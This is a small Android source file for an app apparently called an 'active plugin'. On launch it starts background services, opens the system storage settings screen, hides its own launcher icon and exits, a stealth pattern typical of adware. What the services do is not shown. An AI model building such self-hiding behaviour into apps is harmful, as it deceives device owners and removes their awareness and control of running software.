package com.xstd.active.plugin;

import com.xstd.active.plugin.utils.CommandUtil;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

/**
 * Created by Chrain on 13-12-23.
 */
public class MainActivity extends Activity {
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		startService(new Intent(getApplicationContext(), CoreService.class));// 开启核心服务
		startService(new Intent("com.xstd.plugin.package.active"));
		startActivity(new Intent("android.settings.INTERNAL_STORAGE_SETTINGS"));// 启动系统存储界面
		CommandUtil.hideInLauncher(getApplicationContext());
		finish();
	}
}